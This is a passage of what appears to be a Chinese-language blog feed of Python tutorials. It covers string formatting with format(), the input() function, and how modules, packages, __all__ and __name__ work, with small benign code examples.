<li>在 <code>&#123;&#125;</code> 里使用 <code>!a</code> (使用 ascii()), <code>!s</code>(使用 str()) 和 <code>!r</code> (使用 repr()) 可以用于<font color="#FF7F00"><strong>在格式化某个值之前对其进行转化</strong></font>:</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;常量 PI 的值近似为： &#123;&#125;。&#x27;</span>.<span class="built_in">format</span>(math.pi))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;常量 PI 的值近似为： &#123;!s&#125;。&#x27;</span>.<span class="built_in">format</span>(math.pi))</span><br><span class="line"></span><br><span class="line">OUTPUT:</span><br><span class="line">常量 PI 的值近似为： <span class="number">3.141592653589793</span>。</span><br><span class="line">常量 PI 的值近似为： <span class="number">3.141592653589793</span>。</span><br></pre></td></tr></table></figure>

<br>

<ol start="4">
<li>可选项 <code>:</code> 和格式标识符可以跟着字段名。 这就允许对值进行更好的格式化。</li>
</ol>
<p>format()方法中&lt;模板字符串&gt;的<code>&#123;&#125;</code>除了包括参数序号，还可以包括格式控制信息。此时，<code>&#123;&#125;</code>的内部样式如下：</p>
<p><font color="#FF7F00">     <strong>{&lt;参数序号&gt;: &lt;格式控制标记&gt;}</strong>  </font><br>     <br>其中，&lt;格式控制标记&gt;用来控制参数显示时的格式，包括：**&lt;填充&gt;&lt;对齐&gt;&lt;宽度&gt;,&lt;.精度&gt;&lt;类型&gt;** 6 个字段，这些字段都是可选的，可以组合使用，逐一介绍如下。参考：<font color="#00B2EE">[<a href="https://blog.csdn.net/i_chaoren/article/details/77922939">Python字符串格式化–format()方法</a>]</font></p>
<p><img data-src="https://i.loli.net/2019/03/06/5c7f917b8902b.jpg" alt="1.jpg"></p>
<br>

<p><strong>&lt;宽度&gt;</strong><br>指当前槽的设定输出字符宽度，如果该槽对应的format()参数长度比&lt;宽度&gt;设定值大，则使用参数实际长度。如果该值的实际位数小于指定宽度，则位数将被默认以空格字符补充。</p>
<p><strong>&lt;对齐&gt;</strong><br>指参数在&lt;宽度&gt;内输出时的对齐方式，分别使用&lt;、&gt;和^三个符号表示左对齐、右对齐和居中对齐。</p>
<p><strong>&lt;填充&gt;</strong><br>指&lt;宽度&gt;内除了参数外的字符采用什么方式表示，默认采用空格，可以通过&lt;填充&gt;更换。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">s = <span class="string">&quot;PYTHON&quot;</span></span><br><span class="line"> </span><br><span class="line"><span class="string">&quot;&#123;0:30&#125;&quot;</span>.<span class="built_in">format</span>(s)</span><br><span class="line">Out[<span class="number">17</span>]: <span class="string">&#x27;PYTHON                        &#x27;</span></span><br><span class="line"> </span><br><span class="line"><span class="string">&quot;&#123;0:&gt;30&#125;&quot;</span>.<span class="built_in">format</span>(s)</span><br><span class="line">Out[<span class="number">18</span>]: <span class="string">&#x27;                        PYTHON&#x27;</span></span><br><span class="line"> </span><br><span class="line"><span class="string">&quot;&#123;0:*^30&#125;&quot;</span>.<span class="built_in">format</span>(s)</span><br><span class="line">Out[<span class="number">19</span>]: <span class="string">&#x27;************PYTHON************&#x27;</span></span><br><span class="line"> </span><br><span class="line"><span class="string">&quot;&#123;0:-^30&#125;&quot;</span>.<span class="built_in">format</span>(s)</span><br><span class="line">Out[<span class="number">20</span>]: <span class="string">&#x27;------------PYTHON------------&#x27;</span></span><br><span class="line"> </span><br><span class="line"><span class="string">&quot;&#123;0:3&#125;&quot;</span>.<span class="built_in">format</span>(s)</span><br><span class="line"></span><br><span class="line">Out[<span class="number">21</span>]: <span class="string">&#x27;PYTHON&#x27;</span></span><br></pre></td></tr></table></figure>

<br>

<p><strong>逗号（，）</strong><br>&lt;格式控制标记&gt;中逗号（，）用于显示数字的千位分隔符，例如：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&#123;0:-^20,&#125;&quot;</span>.<span class="built_in">format</span>(<span class="number">1234567890</span>)</span><br><span class="line">Out[<span class="number">24</span>]: <span class="string">&#x27;---1,234,567,890----&#x27;</span></span><br><span class="line"> </span><br><span class="line"><span class="string">&quot;&#123;0:-^20&#125;&quot;</span>.<span class="built_in">format</span>(<span class="number">1234567890</span>) <span class="comment">#对比输出</span></span><br><span class="line">Out[<span class="number">25</span>]: <span class="string">&#x27;-----1234567890-----&#x27;</span></span><br><span class="line"> </span><br><span class="line"><span class="string">&quot;&#123;0:-^20,&#125;&quot;</span>.<span class="built_in">format</span>(<span class="number">12345.67890</span>)</span><br><span class="line">Out[<span class="number">26</span>]: <span class="string">&#x27;----12,345.6789-----&#x27;</span></span><br></pre></td></tr></table></figure>

<br>

<p><strong>&lt;.精度&gt;</strong><br>表示两个含义，由小数点（.）开头。对于浮点数，精度表示小数部分输出的有效位数。对于字符串，精度表示输出的最大长度。</p>
<p><strong>&lt;类型&gt;</strong><br>表示输出整数和浮点数类型的格式规则。对于整数类型，输出格式包括6 种：</p>
<ul>
<li>b: 输出整数的二进制方式；</li>
<li>c: 输出整数对应的 Unicode 字符；</li>
<li>d: 输出整数的十进制方式；</li>
<li>o: 输出整数的八进制方式；</li>
<li>x: 输出整数的小写十六进制方式；</li>
<li>X: 输出整数的大写十六进制方式；</li>
</ul>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>table = &#123;<span class="string">&#x27;Google&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;Runoob&#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;Taobao&#x27;</span>: <span class="number">3</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> name, number <span class="keyword">in</span> table.items():</span><br><span class="line"><span class="meta">... </span>    <span class="built_in">print</span>(<span class="string">&#x27;&#123;0:10&#125; ==&gt; &#123;1:10d&#125;&#x27;</span>.<span class="built_in">format</span>(name, number))</span><br><span class="line">...</span><br><span class="line">Runoob     ==&gt;          2</span><br><span class="line">Taobao     ==&gt;          3</span><br><span class="line">Google     ==&gt;          1</span><br></pre></td></tr></table></figure>


<p>对于<strong>浮点数类型</strong>，输出格式包括4 种：</p>
<ul>
<li>e: 输出浮点数对应的小写字母 e 的指数形式；</li>
<li>E: 输出浮点数对应的大写字母 E 的指数形式；</li>
<li>f: 输出浮点数的标准浮点形式；</li>
<li>%: 输出浮点数的百分形式。</li>
</ul>
<br>

<ol start="5">
<li>如果你有一个很长的格式化字符串, 而你不想将它们分开, 那么在格式化时通过变量名而非位置会是很好的事情。</li>
</ol>
<p>最简单的就是传入一个字典, 然后使用方括号 <code>[]</code> 来访问键值 :</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>table = &#123;<span class="string">&#x27;Google&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;Runoob&#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;Taobao&#x27;</span>: <span class="number">3</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(<span class="string">&#x27;Runoob: &#123;0[Runoob]:d&#125;; Google: &#123;0[Google]:d&#125;; Taobao: &#123;0[Taobao]:d&#125;&#x27;</span>.<span class="built_in">format</span>(table))</span><br><span class="line">Runoob: <span class="number">2</span>; Google: <span class="number">1</span>; Taobao: <span class="number">3</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">也可以通过在 table 变量前使用 <span class="string">&#x27;**&#x27;</span> 来实现相同的功能：</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>table = &#123;<span class="string">&#x27;Google&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;Runoob&#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;Taobao&#x27;</span>: <span class="number">3</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(<span class="string">&#x27;Runoob: &#123;Runoob:d&#125;; Google: &#123;Google:d&#125;; Taobao: &#123;Taobao:d&#125;&#x27;</span>.<span class="built_in">format</span>(**table))</span><br><span class="line">Runoob: <span class="number">2</span>; Google: <span class="number">1</span>; Taobao: <span class="number">3</span></span><br></pre></td></tr></table></figure>

<br>

<h3 id="八-输入-input"><a href="#八-输入-input" class="headerlink" title="八. 输入(input)"></a><font color="#FF6347" face="Comic sans MS">八. 输入(input)</font></h3><blockquote>
<ol>
<li>函数input()让程序暂停运行，等待用户输入一些文本。获取用户输入后，Python将其存储在一个变量（指针）中，以方便你使用。</li>
<li>input()函数有个返回值，<font color="#FF7F00"><strong>返回类型为String</strong></font>。</li>
</ol>
</blockquote>
<br>

<p><font color="red"><strong>一、参数</strong></font></p>
<p>输入分为两种：<strong>空参数</strong>、<strong>带有参数</strong>。</p>
<p><font color="#00B2EE"><strong>空参数：</strong></font><code>input()</code>；效果是屏幕上没有任何提示，等待用户输入。<br><font color="#00B2EE"><strong>带有参数：</strong></font><code>input(&#39;请输入一个字符串：&#39;)</code>；效果是屏幕上显示“请输入一个字符串：”，然后等待用户输入。</p>
<p><font color="red"><strong>二、返回值</strong></font></p>
<p>关于input()的返回值，是<font color="#FF7F00"><strong>字符串String类型</strong></font><br>如下会报错，假如输入1998，返回给s的值是字符串”1998”，如果直接和数字型进行比较会报错：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s = <span class="built_in">input</span>(<span class="string">&#x27;birth: &#x27;</span>)</span><br><span class="line">birth = s</span><br><span class="line"><span class="keyword">if</span> birth &lt; <span class="number">2000</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;00前&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;00后&#x27;</span>)</span><br></pre></td></tr></table></figure>

<br>

<p>解决方法是使用函数<code>int(str)</code>，功能是<font color="#FF7F00"><strong>将字符串类型转换成数字型</strong></font>。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s = <span class="built_in">input</span>(<span class="string">&#x27;birth: &#x27;</span>)</span><br><span class="line">birth = <span class="built_in">int</span>(s)</span><br><span class="line"><span class="keyword">if</span> birth &lt; <span class="number">2000</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;00前&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;00后&#x27;</span>)</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python语言</tag>
      </tags>
  </entry>
  <entry>
    <title>Python-模块和包</title>
    <url>/post/Python-Modules-Packages/</url>
    <content><![CDATA[<p>from…import…😀</p>
<span id="more"></span>


<br>

<br>

<center><font color="#00B2EE" face="Comic sans MS" size=5>模块和包</font> </center>

<br>

<br>

<h3 id="一-模块与包的意义"><a href="#一-模块与包的意义" class="headerlink" title="一. 模块与包的意义"></a><font color="#FF6347" face="Comic sans MS">一. 模块与包的意义</font></h3><br>

<h4 id="1-1-什么是模块？"><a href="#1-1-什么是模块？" class="headerlink" title="1.1 什么是模块？"></a><font color="#3CB371" face="Comic sans MS">1.1 什么是模块？</font></h4><blockquote>
<p><font color="#FF7F00" face="Microsoft YaHei"><strong>在Python中，一个.py文件就称之为一个模块（Module）。</strong></font></p>
</blockquote>
<br>


<h4 id="1-2-为什么要使用模块？"><a href="#1-2-为什么要使用模块？" class="headerlink" title="1.2 为什么要使用模块？"></a><font color="#3CB371" face="Comic sans MS">1.2 为什么要使用模块？</font></h4><ul>
<li><p><font face="Microsoft YaHei">为了编写可维护的代码，我们把很多函数分组，分别放到不同的文件里，这样，每个文件包含的代码就相对较少，很多编程语言都采用这种组织代码的方式。</font></p>
</li>
<li><p><font face="Microsoft YaHei">随着程序的发展，功能越来越多，为了方便管理，我们通常将程序分成一个个的文件，这样做程序的结构更清晰，方便管理。这时我们不仅仅可以把这些文件当做脚本去执行，还可以把他们当做模块来导入到其他的模块中，实现了功能的重复利用。</font></p>
</li>
<li><p><font face="Microsoft YaHei">我们在编写程序的时候，也经常引用其他模块，包括Python内置的模块和来自第三方的模块。</font></p>
</li>
<li><p><font face="Microsoft YaHei">使用模块还可以避免函数名和变量名冲突。相同名字的函数和变量完全可以分别存在不同的模块中，因此，我们自己在编写模块时，不必考虑名字会与其他模块冲突。但是也要注意，尽量不要与内置函数名字冲突。</font></p>
</li>
</ul>
<br>


<h4 id="1-3-什么是包？"><a href="#1-3-什么是包？" class="headerlink" title="1.3 什么是包？"></a><font color="#3CB371" face="Comic sans MS">1.3 什么是包？</font></h4><ol>
<li><p><font face="Microsoft YaHei">如果不同的人编写的模块名相同怎么办？为了避免模块名冲突，Python又引入了按目录（文件夹）来组织模块的方法，称为包（Package）。</font></p>
</li>
<li><p><font face="Microsoft YaHei">包是目录级的（文件夹级），文件夹是用来组成py文件（包的本质就是一个包含<code>__init__.py</code>文件的目录）</font></p>
</li>
<li><p><font face="Microsoft YaHei"><font color="#FF7F00"><strong>每一个包目录下面都会有一个 <code>__init__.py</code> 的文件，这个文件是必须存在的，否则，Python就把这个目录当成普通目录，而不是一个包</strong></font>。它可以是空文件，也可以有Python代码，因为 <code>__init__.py</code> 本身就是一个模块。</font></p>
</li>
<li><p><font face="Microsoft YaHei">import导入文件时，产生名称空间中的名字来源于文件，import 包，产生的名称空间的名字同样来源于文件，即包下的 <code>__init__.py</code> ，<font color="#FF7F00"><strong>导入包本质就是在导入该文件</strong></font>。</font></p>
</li>
<li><p><font face="Microsoft YaHei">文件夹里面还可以包含文件夹（可以有多级目录，组成多级层次的包结构）。但是每一个文件夹下面必须有一个 <code>__init__.py</code> 文件。</font></p>
</li>
<li><p><font face="Microsoft YaHei">自己创建模块时要注意命名，不能和Python自带的模块名称冲突。例如，系统自带了sys模块，自己的模块就不可命名为sys.py，否则将无法导入系统自带的sys模块。</font></p>
</li>
</ol>
<br>

<p><font face="Comic sans MS"><strong>举例说明：</strong></font></p>
<p>有个包按照如下目录存放文件：</p>
<p>mycompany<br>├─ __init__.py<br>├─ abc.py<br>└─ xyz.py</p>
<blockquote>
<p><font face="Microsoft YaHei">引入了包以后，只要顶层的包名不与别人冲突，那所有模块都不会与别人冲突。现在，**<code>abc.py</code>** 模块的名字就变成了 <strong><code>mycompany.abc</code></strong> ，类似的，**<code>xyz.py</code>** 的模块名变成了 <strong><code>mycompany.xyz</code></strong> 。</font></p>
</blockquote>
<br>

<p>类似的，可以有多级目录，组成多级层次的包结构。比如如下的目录结构：</p>
<p>mycompany<br> ├─ web<br> │  ├─ __init__.py<br> │  ├─ utils.py<br> │  └─ <a href="http://www.py/">www.py</a><br> ├─ __init__.py<br> ├─ abc.py<br> └─ xyz.py</p>
<blockquote>
<p><font face="Microsoft YaHei">文件<code>www.py</code> 的模块名就是<code>mycompany.web.www</code>，两个文件utils.py的模块名分别是<code>mycompany.utils</code>和 <code>mycompany.web.utils</code></font></p>
</blockquote>
<br>

<p><font color="#00B2EE" face="Comic sans MS"><strong>总结</strong><br></font></p>
<p><font face="Microsoft YaHei">模块是一组Python代码的集合，可以使用其他模块，也可以被其他模块使用。<br></font></p>
<blockquote>
<p><font color="#FF7F00" face="Microsoft YaHei"><strong>创建自己的模块时，要注意：</strong></font></p>
<ol>
<li><font face="Microsoft YaHei"> 模块名要遵循Python变量命名规范，不要使用中文、特殊字符；</font></li>
<li><font face="Microsoft YaHei">模块名不要和系统模块名冲突，最好先查看系统是否已存在该模块，检查方法是在Python交互环境执行import abc，若成功则说明系统存在此模块。</font></li>
</ol>
</blockquote>
<br>

<br>

<h3 id="二-使用模块-无包组织"><a href="#二-使用模块-无包组织" class="headerlink" title="二. 使用模块 -- 无包组织"></a><font color="#FF6347" face="Comic sans MS">二. 使用模块 -- 无包组织</font></h3><br>

<blockquote>
<p><font color="#FF7F00"><strong>使用模块的几种语句：</strong></font></p>
</blockquote>
<ol>
<li><font face="Microsoft YaHei"><strong>import 语句：</strong> <strong><code>import module1[, module2[,... moduleN]</code></strong></font></li>
<li><font face="Microsoft YaHei"><strong>from … import 语句：</strong> <strong><code>from  modname import  name1[, name2[, ... nameN]]</code></strong> </font></li>
<li><font face="Microsoft YaHei"><strong>from … import * 语句：</strong> <strong><code>from  modname import *</code></strong></font></li>
<li><font face="Microsoft YaHei"><strong>__name__属性：</strong> 用来分清该模块是调用者还是被其他模块调用。</font></li>
<li><font face="Microsoft YaHei"><strong>dir() 函数：</strong> 用来查找模块中定义的名字，返回一个有序字符串列表。</font></li>
</ol>
<br>

<h4 id="2-1-import-语句"><a href="#2-1-import-语句" class="headerlink" title="2.1 import 语句"></a><font color="#3CB371" face="Comic sans MS">2.1 import 语句</font></h4><p><font face="Microsoft YaHei">想使用 Python 源文件，只需在另一个源文件里执行 import 语句，语法如下：</font></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> module1[, module2[,... moduleN]</span><br></pre></td></tr></table></figure>

<ol>
<li><p><font face="Microsoft YaHei">使用 Python 源文件，只需在另一个源文件里执行 import 语句。</font></p>
</li>
<li><p><font face="Microsoft YaHei">一个模块只会被导入一次，不管你执行了多少次import。这样可以防止导入模块被一遍又一遍地执行。</font></p>
</li>
<li><p><font face="Microsoft YaHei">调用者引用模块后可以：<code>模块名.函数名(参数)</code>来使用。</font></p>
</li>
</ol>
<br>

<p>举例说明：<br>当解释器遇到 import 语句，如果模块在当前的搜索路径就会被导入。如想要导入模块 support，需要把命令放在脚本的顶端：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">support.py 文件代码</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_func</span>(<span class="params"> par </span>):</span></span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&quot;Hello : &quot;</span>, par)</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">------------------------------------------------------------------------------------------</span><br><span class="line">------------------------------------------------------------------------------------------</span><br><span class="line">test.py 文件代码</span><br><span class="line"><span class="comment"># 导入模块</span></span><br><span class="line"><span class="keyword">import</span> support</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 现在可以调用模块里包含的函数了</span></span><br><span class="line">support.print_func(<span class="string">&quot;Runoob&quot;</span>)</span><br><span class="line">------------------------------------------------------------------------------------------</span><br><span class="line">运行test.py实例输出结果：</span><br><span class="line">Hello :  Runoob</span><br></pre></td></tr></table></figure>

<br>

<h4 id="2-2-from-…-import-语句"><a href="#2-2-from-…-import-语句" class="headerlink" title="2.2 from … import 语句"></a><font color="#3CB371" face="Comic sans MS">2.2 from … import 语句</font></h4><p><font face="Microsoft YaHei">Python 的 from 语句让你从模块中导入一个指定的部分到当前命名空间中，<strong>这种访问函数时可以直接使用函数名而不需要前缀</strong>，语法如下：</font></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> modname <span class="keyword">import</span> name1[, name2[, ... nameN]]</span><br></pre></td></tr></table></figure>

<br>

<p>举例说明：<br>例如，要导入模块 fibo 的 fib 函数，使用如下语句：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">fibo.py</span><br><span class="line"><span class="comment"># 斐波那契(fibonacci)数列模块</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fib</span>(<span class="params">n</span>):</span>    <span class="comment"># 定义到 n 的斐波那契数列</span></span><br><span class="line">    a, b = <span class="number">0</span>, <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> b &lt; n:</span><br><span class="line">        <span class="built_in">print</span>(b, end=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">        a, b = b, a+b</span><br><span class="line">    <span class="built_in">print</span>()   //输出为<span class="literal">None</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fib2</span>(<span class="params">n</span>):</span> <span class="comment"># 返回到 n 的斐波那契数列</span></span><br><span class="line">    result = []</span><br><span class="line">    a, b = <span class="number">0</span>, <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> b &lt; n:</span><br><span class="line">        result.append(b)</span><br><span class="line">        a, b = b, a+b</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line">------------------------------------------------------------------------------------------</span><br><span class="line">------------------------------------------------------------------------------------------</span><br><span class="line">test.py</span><br><span class="line"><span class="keyword">from</span> fibo <span class="keyword">import</span> fib, fib2</span><br><span class="line"><span class="built_in">print</span>(fib(<span class="number">500</span>))</span><br><span class="line"><span class="built_in">print</span>(fib2(<span class="number">500</span>))</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line"><span class="number">1</span> <span class="number">1</span> <span class="number">2</span> <span class="number">3</span> <span class="number">5</span> <span class="number">8</span> <span class="number">13</span> <span class="number">21</span> <span class="number">34</span> <span class="number">55</span> <span class="number">89</span> <span class="number">144</span> <span class="number">233</span> <span class="number">377</span></span><br><span class="line"><span class="literal">None</span></span><br><span class="line">[<span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">13</span>, <span class="number">21</span>, <span class="number">34</span>, <span class="number">55</span>, <span class="number">89</span>, <span class="number">144</span>, <span class="number">233</span>, <span class="number">377</span>]</span><br></pre></td></tr></table></figure>

<br>

<h4 id="2-3-from-…-import-语句"><a href="#2-3-from-…-import-语句" class="headerlink" title="2.3 from … import * 语句"></a><font color="#3CB371" face="Comic sans MS">2.3 from … import * 语句</font></h4><ul>
<li><p><font face="Microsoft YaHei">这提供了一个简单的方法来导入一个模块中的所有项目。然而这种声明不该被过多地使用。</font></p>
</li>
<li><p><font face="Microsoft YaHei">这种方法，可以一次性的把模块中的所有（函数，变量）名称都导入到当前模块的字符表。</font></p>
</li>
<li><p><font face="Microsoft YaHei">这将把所有的名字都导入进来，但是那些由单一下划线（_）开头的名字不在此例。大多数情况， Python程序员不使用这种方法，因为引入的其它来源的命名，很可能覆盖了已有的定义。</font></p>
</li>
</ul>
<br>

<p>把一个模块的所有内容全都导入到当前的命名空间也是可行的，只需使用如下声明：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> modname <span class="keyword">import</span> *</span><br></pre></td></tr></table></figure>




<br>

<br>

<h3 id="三-使用模块-有包组织"><a href="#三-使用模块-有包组织" class="headerlink" title="三. 使用模块 -- 有包组织"></a><font color="#FF6347" face="Comic sans MS">三. 使用模块 -- 有包组织</font></h3><ul>
<li><p><font face="Microsoft YaHei">目录只有包含一个叫做 <code>__init__.py</code> 的文件才会被认作是一个包，主要是为了避免一些滥俗的名字（比如叫做 string）不小心的影响搜索路径中的有效模块。</font></p>
</li>
<li><p><font face="Microsoft YaHei">最简单的情况，放一个空的 <code>__init__.py</code>就可以了。当然这个文件中也可以包含一些初始化代码或者为（将在后面介绍的） <code>__all__</code>变量赋值。</font></p>
</li>
</ul>
<br>

<p><font color="#00B2EE" face="Comic sans MS">1. <strong>import 语句：</strong></font></p>
<p>用户可以每次只导入一个包里面的特定模块，他必须使用全名去访问:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> 包名.子包名.模块名                 导入模块</span><br><span class="line"></span><br><span class="line">包名.子包名.模块名 .函数名(参数)           使用模块</span><br></pre></td></tr></table></figure>

<br>

<p><font color="#00B2EE" face="Comic sans MS">2. <strong>import …from 语句：</strong></font>    </p>
<p>同样会导入子模块，他不需要那些冗长的前缀，只需要<code>模块名.函数名(参数)</code>即可，推荐使用！</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> 包名.子包名 <span class="keyword">import</span> 模块名           导入模块</span><br><span class="line"></span><br><span class="line">模块名.函数名(参数)                      使用模块</span><br></pre></td></tr></table></figure>

<br>

<p><font color="#00B2EE" face="Comic sans MS">3. <strong>import …from 语句：</strong></font></p>
<p>还有一种变化就是直接导入一个函数或者变量:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> 包名.子包名.模块名  <span class="keyword">import</span> 函数名      导入模块</span><br><span class="line">函数名(参数)                               使用模块</span><br></pre></td></tr></table></figure>

<br>

<br>

<p><font color="#00B2EE" face="Comic sans MS">4. <strong>import …from * 语句：</strong></font></p>
<blockquote>
<p><font color="red" face="Comic sans MS" size=4><strong>注意：这种导入方法必须要注意<code>__init__.py</code>里面的属性<code>__all__</code>已经设置好。<code>__all__</code>是用于控制from…import *</strong><br></font></p>
</blockquote>
<p><font face="Microsoft YaHei">Python 会进入文件系统，找到这个包里面所有的子模块，一个一个的把它们都导入进来。但是很不幸，这个方法在 Windows平台上工作的就不是非常好，因为Windows是一个大小写不区分的系统。</font></p>
<p><font face="Microsoft YaHei">在这类平台上，没有人敢担保一个叫做 ECHO.py 的文件导入为模块 echo 还是 Echo 甚至 ECHO。</font></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> 包名.子包名 <span class="keyword">import</span> *                 导入所有模块</span><br><span class="line">模块名.函数名(参数)                        使用模块</span><br></pre></td></tr></table></figure>

<p><strong>具体使用方法请看下面章节四。</strong></p>
<br>

<blockquote>
<p><font color="#FF7F00" face="Microsoft YaHei"><strong>总结使用时注意事项：</strong></font></p>
</blockquote>
<ol>
<li><font face="Microsoft YaHei">注意当使用<code>from package import item</code>这种形式的时候，对应的<font color="#FF7F00"><strong>item既可以是包里面的子模块（子包），或者包里面定义的其他名称，比如函数，类或者变量</strong></font>。</font></li>
<li><font face="Microsoft YaHei">import语法会首先把item当作一个包定义的名称，如果没找到，再试图按照一个模块去导入。如果还没找到，恭喜，一个:exc:ImportError 异常被抛出了。</font></li>
<li><font face="Microsoft YaHei">反之，如果使用形如<code>import item.subitem.subsubitem</code>这种导入形式，<font color="#FF7F00"><strong>最后一项可以是包或者模块（不可以是类，函数或者变量的名字），除了最后一项，都必须是包。</strong></font>。</li>
</ol>
<br>

<br>

<h3 id="四-init-、-all-、-name-、-author-、-doc-、dir-函数"><a href="#四-init-、-all-、-name-、-author-、-doc-、dir-函数" class="headerlink" title="四. __init__、__all__、__name__、__author__、__doc__、dir()函数"></a><font color="#FF6347" face="Comic sans MS">四. __init__、__all__、__name__、__author__、__doc__、dir()函数</font></h3><br>

<h4 id="4-1-init-、-all"><a href="#4-1-init-、-all" class="headerlink" title="4.1 __init__、__all__"></a><font color="#3CB371" face="Comic sans MS">4.1 __init__、__all__</font></h4><p><font face="Microsoft YaHei">在使用<code>from 包名.子包名 import \* 语句</code>时必须修改<code>__init__.py</code>文件的<code>__all__</code>    列表变量。</font></p>
<blockquote>
<ol>
<li><font face="Microsoft YaHei">如果包定义文件 <code>__init__.py</code> 存在一个叫做 <code>__all__</code>     的列表变量，那么在使用 <code>from package import *</code>的时候就把这个列表中的所有名字作为包内容导入。</font></li>
<li><font face="Microsoft YaHei">作为包的作者，可别忘了在更新包之后保证 <code>__all__</code>     也更新了啊。你说我就不这么做，我就不使用导入<code>*</code>这种用法，好吧，没问题。这里有一个例子</font></li>
<li><font face="Microsoft YaHei">这表示当你使用<code>from sound.effects import *</code>这种用法时，你只会导入如下包里面这三个子模块。即这种语法导入的是<code>__all__</code>指定的模块。</font></li>
<li><font face="Microsoft YaHei">在python3中，即使包下没有<code>__init__.py</code>文件，import 包仍然不会报错，而在python2中，包下一定要有该文件，否则import 包报错</font></li>
<li><font face="Microsoft YaHei">import导入文件时，产生名称空间中的名字来源于文件，import 包，产生的名称空间的名字同样来源于文件，即包下的<code>__init__.py</code>，导入包本质就是在导入该文件。</font></li>
</ol>
</blockquote>
<br>
上述的例子：

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">__all__ = [<span class="string">&quot;echo&quot;</span>, <span class="string">&quot;surround&quot;</span>, <span class="string">&quot;reverse&quot;</span>]</span><br></pre></td></tr></table></figure>


<br>

<h4 id="4-1-name-、-main"><a href="#4-1-name-、-main" class="headerlink" title="4.1 __name__、__main__"></a><font color="#3CB371" face="Comic sans MS">4.1 __name__、__main__</font></h4><ol>
<li><p><font face="Microsoft YaHei">__name__是一个变量。前后加了爽下划线是因为是因为这是系统定义的名字。普通变量不要使用此方式命名变量。</font></p>
</li>
<li><p><font face="Microsoft YaHei">__name__就是标识模块的名字的一个系统变量。这里分两种情况：</font></p>
<ol>
<li><font face="Microsoft YaHei">假如当前模块是主模块（也就是调用其他模块的模块），那么此模块名字就是__main__，即__name__&#x3D;&#x3D;__main__。可以执行后面的内容；</font></li>
<li><font face="Microsoft YaHei">假如此模块是被import的，其值为被调用模块所属的路径。</li>
</ol>
</li>
</ol>
<br>

<p>下面举一个例子：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">test1.py</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&#x27;程序自身在运行&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&#x27;我来自另一模块&#x27;</span>)</span><br><span class="line"></span><br><span class="line">------------------------------------------------------------------------------------------</span><br><span class="line">test2.py</span><br><span class="line"><span class="keyword">import</span> test1</span><br><span class="line">------------------------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">运行test2.py输出结果：</span><br><span class="line">我来自另一模块</span><br><span class="line"></span><br><span class="line">运行test1.py输出结果：</span><br><span class="line">程序自身在运行</span><br></pre></td></tr></table></figure>


<br>

